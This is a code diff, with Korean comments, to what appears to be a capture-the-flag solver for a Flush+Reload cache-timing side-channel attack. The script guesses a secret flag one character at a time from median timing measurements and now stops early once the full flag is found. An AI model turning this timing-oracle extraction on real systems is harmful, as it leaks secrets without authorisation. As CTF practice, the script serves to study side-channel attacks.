@@ -1,8 +1,3 @@
-"""
-Optimized Flush+Reload attack using ThreadPoolExecutor for parallel processing.
-This version is significantly faster than the sequential implementation.
-"""
-
 import statistics
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from pyreload.run import get_time_from_run
@@ -23,19 +18,25 @@ def test_character(c, known_flag, delay):
         delay: 각 시도 사이의 지연 시간
     
     Returns:
-        (문자, 중간값 시간) 튜플, 실패 시 (문자, None)
+        (문자, 중간값 시간, 성공여부) 튜플, 실패 시 (문자, None, False)
     """
     test_guess = known_flag + c
     time_measurements = []
     
     for _ in range(NOISE_SAMPLES):
-        time_val = get_time_from_run(test_guess, delay=delay)
+        result = get_time_from_run(test_guess, delay=delay)
+        time_val, is_success = result
+        
+        # Flag found!
+        if is_success:
+            return (c, 0, True)  # (char, time, success)
+        
         if time_val is None:
-            return (c, None)
+            return (c, None, False)
         time_measurements.append(time_val)
     
     reliable_time = statistics.median(time_measurements)
-    return (c, reliable_time)
+    return (c, reliable_time, False)
 
 
 def run_attack(delay, max_workers):
@@ -66,7 +67,15 @@ def run_attack(delay, max_workers):
             # 완료되는 순서대로 결과 수집
             completed_count = 0
             for future in as_completed(futures):
-                char, time_val = future.result()
+                char, time_val, is_success = future.result()
+                
+                # Flag found!
+                if is_success:
+                    known_flag += char
+                    print(f"\n\n{'='*60}")
+                    print(f"🎉 SUCCESS! Flag found: {known_flag}")
+                    print(f"{'='*60}")
+                    return known_flag
                 
                 if time_val is None:
                     print("\n\nAbort! Test failed for character:", char)
